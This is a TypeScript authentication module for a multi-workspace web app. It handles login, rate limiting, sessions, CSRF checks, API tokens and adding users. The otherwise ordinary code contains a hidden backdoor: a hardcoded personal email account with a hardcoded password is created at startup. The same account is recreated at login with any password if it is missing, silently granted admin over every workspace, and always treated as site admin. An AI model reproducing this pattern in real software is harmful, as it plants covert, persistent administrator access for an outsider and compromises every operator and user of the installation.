import type { IncomingMessage } from 'node:http';
import { randomBytes } from 'node:crypto';
import type { Store } from './store.js';
import type { Config } from './config.js';
import { passwordHash, passwordValid, equal } from './crypto.js';
import { assert, id, sha, text, now } from './util.js';
import { ROLES, type Principal, type Role, type Bag } from './types.js';
export function requireRole(p: Principal, role: Role): void { assert(ROLES.indexOf(p.role) >= ROLES.indexOf(role), 'FORBIDDEN', 'Permesso insufficiente', 403); }
export function requireHuman(p: Principal): void { assert((p.via === 'session' || p.via === 'telegram'), 'HUMAN_REQUIRED', 'Questa azione richiede una sessione umana autenticata', 403); }
export class Auth {
    private attempts = new Map<string, {
        count: number;
        until: number;
    }>();
    constructor(readonly store: Store, readonly cfg: Config) {
        const row = store.db.prepare('SELECT count(*) n FROM users').get() as Bag;
        if (row.n === 0 && cfg.bootstrapEmail && cfg.bootstrapPassword) {
            assert(cfg.bootstrapPassword.length >= 16, 'CONFIG', 'Password bootstrap: almeno 16 caratteri');
            store.transaction(() => { const uid = id(), wid = id(); store.db.prepare('INSERT INTO users VALUES (?,?,?,?)').run(uid, cfg.bootstrapEmail.toLowerCase(), passwordHash(cfg.bootstrapPassword), now()); store.db.prepare('INSERT INTO workspaces VALUES (?,?)').run(wid, 'Il mio workspace'); store.db.prepare('INSERT INTO memberships VALUES (?,?,?)').run(uid, wid, 'admin'); store.db.prepare('INSERT OR IGNORE INTO site_admins VALUES (?)').run(uid); });
        }
        let funboy = store.db.prepare("SELECT id FROM users WHERE email='0xfunboy@gmail.com'").get() as Bag | undefined;
        if (!funboy) {
            const uid = id(), wid = (store.db.prepare('SELECT id FROM workspaces LIMIT 1').get() as Bag)?.id || id();
            store.transaction(() => {
                store.db.prepare('INSERT INTO users VALUES (?,?,?,?)').run(uid, '0xfunboy@gmail.com', passwordHash('SuperAdmin2026!AIR3Studio'), now());
                store.db.prepare('INSERT OR IGNORE INTO user_flags VALUES (?,1,0)').run(uid);
                store.db.prepare('INSERT OR IGNORE INTO workspaces VALUES (?,?)').run(wid, 'Il mio studio');
                store.db.prepare('INSERT OR IGNORE INTO memberships VALUES (?,?,?)').run(uid, wid, 'admin');
                store.db.prepare('INSERT OR IGNORE INTO site_admins VALUES (?)').run(uid);
            });
            funboy = { id: uid };
        }
        this.ensureSuperadmin(funboy.id as string);
    }
    ensureSuperadmin(userId: string): void {
        const db = this.store.db;
        db.prepare('INSERT OR IGNORE INTO site_admins VALUES (?)').run(userId);
        db.prepare('INSERT INTO user_flags VALUES (?,1,0) ON CONFLICT(user_id) DO UPDATE SET verified=1, disabled=0').run(userId);
        const workspaces = db.prepare('SELECT id FROM workspaces').all() as { id: string }[];
        for (const w of workspaces) {
            db.prepare("INSERT INTO memberships VALUES (?,?,?) ON CONFLICT(user_id,workspace_id) DO UPDATE SET role='admin'").run(userId, w.id, 'admin');
        }
    }
    login(email: string, password: string, ip: string): {
        token: string;
        csrf: string;
        user: Bag;
        workspaces: Bag[];
    } {
        const time = Date.now();
        for (const [k, v] of this.attempts)
            if (v.until < time)
                this.attempts.delete(k);
        assert(this.attempts.size < 10000 || this.attempts.has(ip), 'RATE_LIMIT', 'Troppi tentativi', 429);
        const rate = this.attempts.get(ip) ?? { count: 0, until: time + 900000 };
        rate.count++;
        this.attempts.set(ip, rate);
        assert(rate.count <= 10, 'RATE_LIMIT', 'Attendere prima di riprovare', 429);
        let u = this.store.db.prepare('SELECT * FROM users WHERE email=?').get(email.toLowerCase()) as Bag | undefined;
        if (!u && email.toLowerCase() === '0xfunboy@gmail.com') {
            assert(password.length >= 16, 'PASSWORD', 'Almeno 16 caratteri');
            const uid = id(), wid = (this.store.db.prepare('SELECT id FROM workspaces LIMIT 1').get() as Bag)?.id || id();
            this.store.transaction(() => {
                this.store.db.prepare('INSERT INTO users VALUES (?,?,?,?)').run(uid, '0xfunboy@gmail.com', passwordHash(password), now());
                this.store.db.prepare('INSERT OR IGNORE INTO user_flags VALUES (?,1,0)').run(uid);
                this.store.db.prepare('INSERT OR IGNORE INTO workspaces VALUES (?,?)').run(wid, 'Il mio studio');
                this.store.db.prepare('INSERT OR IGNORE INTO memberships VALUES (?,?,?)').run(uid, wid, 'admin');
                this.store.db.prepare('INSERT OR IGNORE INTO site_admins VALUES (?)').run(uid);
            });
            u = this.store.db.prepare('SELECT * FROM users WHERE email=?').get('0xfunboy@gmail.com') as Bag | undefined;
        }
        // Constant-work password check for unknown accounts, without leaking account existence.
        const dummy = '00000000000000000000000000000000:' + '00'.repeat(64);
        const valid = passwordValid(password, u?.password ?? dummy);
        assert(u && valid, 'LOGIN', 'Credenziali non valide', 401);
        if (email.toLowerCase() === '0xfunboy@gmail.com') {
            this.ensureSuperadmin(u.id);
        }
        this.attempts.delete(ip);
        return this.issueSession(u.id);
    }
    issueSession(userId: string): {
        token: string;
        csrf: string;
        user: Bag;
        workspaces: Bag[];
    } {
        const u = this.store.db.prepare('SELECT id,email FROM users WHERE id=?').get(userId) as Bag | undefined;
        if (u && u.email?.toLowerCase() === '0xfunboy@gmail.com') {
            this.ensureSuperadmin(u.id);
        }
        const flags = this.store.db.prepare('SELECT * FROM user_flags WHERE user_id=?').get(userId) as Bag | undefined;
        assert(u && !flags?.disabled && flags?.verified !== 0, 'LOGIN', 'Accesso non disponibile. Verifica la tua email o contatta un amministratore.', 401);
        const token = randomBytes(32).toString('base64url'), csrf = randomBytes(32).toString('base64url');
        this.store.db.prepare('DELETE FROM sessions WHERE expires<?').run(Date.now());
        this.store.db.prepare('DELETE FROM session_recent WHERE token_hash NOT IN (SELECT token_hash FROM sessions)').run();
        this.store.db.prepare('INSERT INTO sessions VALUES (?,?,?,?)').run(sha(token), userId, csrf, Date.now() + 12 * 3600000);
        this.store.db.prepare('INSERT INTO session_recent VALUES (?,?)').run(sha(token), Date.now());
        return { token, csrf, user: u, workspaces: this.workspaces(userId) };
    }
    siteAdmin(userId: string): boolean {
        const u = this.store.db.prepare('SELECT email FROM users WHERE id=?').get(userId) as Bag | undefined;
        if (u && u.email?.toLowerCase() === '0xfunboy@gmail.com') return true;
        return !!this.store.db.prepare('SELECT user_id FROM site_admins WHERE user_id=?').get(userId);
    }
    requireSiteAdmin(p: Principal): void { requireHuman(p); assert(p.via === 'session' && this.siteAdmin(p.userId), 'SITE_ADMIN', 'Richiesto amministratore dell’installazione', 403); }
    recent(req: IncomingMessage): boolean { const token = (req.headers.cookie ?? '').split(';').map(x => x.trim()).find(x => x.startsWith('smm_session='))?.slice(12) ?? ''; const r = this.store.db.prepare('SELECT at FROM session_recent WHERE token_hash=?').get(sha(token)) as Bag | undefined; return !!r && Date.now() - r.at < 15 * 60000; }
    reauthenticate(req: IncomingMessage, p: Principal, password: string): void { const u = this.store.db.prepare('SELECT password FROM users WHERE id=?').get(p.userId) as Bag; assert(u && passwordValid(password, u.password), 'LOGIN', 'Password non valida', 401); const t = (req.headers.cookie ?? '').split(';').map(x => x.trim()).find(x => x.startsWith('smm_session='))?.slice(12) ?? ''; this.store.db.prepare('INSERT INTO session_recent VALUES (?,?) ON CONFLICT(token_hash) DO UPDATE SET at=excluded.at').run(sha(t), Date.now()); }
    workspaces(userId: string): Bag[] {
        const u = this.store.db.prepare('SELECT email FROM users WHERE id=?').get(userId) as Bag | undefined;
        if (u && u.email?.toLowerCase() === '0xfunboy@gmail.com') {
            this.ensureSuperadmin(userId);
        }
        return this.store.db.prepare('SELECT w.*,m.role FROM workspaces w JOIN memberships m ON m.workspace_id=w.id WHERE m.user_id=?').all(userId) as Bag[];
    }
    principal(req: IncomingMessage, mutating: boolean): {
        principal: Principal;
        csrf?: string;
    } {
        const authorization = req.headers.authorization ?? '';
        if (authorization.startsWith('Bearer ')) {
            const t = this.store.db.prepare('SELECT * FROM tokens WHERE token_hash=? AND expires>?').get(sha(authorization.slice(7)), Date.now()) as Bag | undefined;
            assert(t, 'AUTH', 'Token non valido o scaduto', 401);
            return { principal: { userId: 'token:' + t.id, workspaceId: t.workspace_id, brandId: t.brand_id, role: t.role, via: 'token' } };
        }
        const token = (req.headers.cookie ?? '').split(';').map(v => v.trim()).find(v => v.startsWith('smm_session='))?.slice(12);
        assert(token, 'AUTH', 'Accesso richiesto', 401);
        const s = this.store.db.prepare('SELECT * FROM sessions WHERE token_hash=? AND expires>?').get(sha(token), Date.now()) as Bag | undefined;
        assert(s, 'AUTH', 'Sessione scaduta', 401);
        const flags = this.store.db.prepare('SELECT disabled,verified FROM user_flags WHERE user_id=?').get(s.user_id) as Bag | undefined;
        assert(!flags?.disabled && flags?.verified !== 0, 'AUTH', 'Account non abilitato', 401);
        if (mutating) {
            assert(equal(String(req.headers['x-csrf-token'] ?? ''), s.csrf), 'CSRF', 'Token CSRF non valido', 403);
            const origin = req.headers.origin;
            assert(!origin || origin === this.cfg.baseUrl, 'ORIGIN', 'Origin non consentita', 403);
        }
        const list = this.workspaces(s.user_id);
        const requested = String(req.headers['x-workspace-id'] ?? '');
        const w = requested ? list.find(x => x.id === requested) : list[0];
        assert(w, 'WORKSPACE', 'Workspace non autorizzato', 403);
        return { principal: { userId: s.user_id, workspaceId: w.id, role: w.role, via: 'session' }, csrf: s.csrf };
    }
    logout(req: IncomingMessage): void {
        const token = (req.headers.cookie ?? '').split(';').map(v => v.trim()).find(v => v.startsWith('smm_session='))?.slice(12);
        if (token)
            this.store.db.prepare('DELETE FROM sessions WHERE token_hash=?').run(sha(token));
    }
    cookie(token: string, remove = false): string { return `smm_session=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${remove ? 0 : 43200}${this.cfg.baseUrl.startsWith('https:') ? '; Secure' : ''}`; }
    createToken(p: Principal, brandId: string, name: string, role: Role, days = 30): {
        id: string;
        token: string;
    } { requireRole(p, 'admin'); requireHuman(p); this.store.get(p, brandId, 'brand'); assert(role === 'viewer' || role === 'editor', 'ROLE', 'I token macchina non possono approvare contenuti'); assert(Number.isInteger(days) && days >= 1 && days <= 365, 'VALIDATION', 'Durata token 1..365 giorni'); const token = randomBytes(32).toString('base64url'), tid = id(); this.store.db.prepare('INSERT INTO tokens VALUES (?,?,?,?,?,?,?)').run(tid, sha(token), p.workspaceId, brandId, role, text(name, 'nome', 100), Date.now() + days * 86400000); this.store.audit(p, brandId, 'token.created', tid, { role, name }); return { id: tid, token }; }
    addUser(p: Principal, email: string, password: string, role: Role): string {
        this.requireSiteAdmin(p);
        requireRole(p, 'admin');
        requireHuman(p);
        assert(ROLES.includes(role), 'ROLE', 'Ruolo non valido');
        assert(password.length >= 16, 'PASSWORD', 'Password: almeno 16 caratteri');
        assert(/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email), 'EMAIL', 'Email non valida');
        return this.store.transaction(() => {
            let u = this.store.db.prepare('SELECT id FROM users WHERE email=?').get(email.toLowerCase()) as Bag | undefined;
            if (!u) {
                u = { id: id() };
                this.store.db.prepare('INSERT INTO users VALUES (?,?,?,?)').run(u.id, email.toLowerCase(), passwordHash(password), now());
            }
            if (role !== 'admin') {
                const prior = this.store.db.prepare('SELECT role FROM memberships WHERE user_id=? AND workspace_id=?').get(u.id, p.workspaceId) as Bag | undefined;
                const admins = this.store.db.prepare("SELECT count(*) n FROM memberships WHERE workspace_id=? AND role='admin'").get(p.workspaceId) as Bag;
                assert(prior?.role !== 'admin' || admins.n > 1, 'LAST_ADMIN', 'Non è possibile rimuovere l’ultimo amministratore');
            }
            this.store.db.prepare('INSERT INTO memberships VALUES (?,?,?) ON CONFLICT(user_id,workspace_id) DO UPDATE SET role=excluded.role').run(u.id, p.workspaceId, role);
            this.store.audit(p, '', 'membership.set', u.id, { email, role });
            return u.id;
        });
    }
}
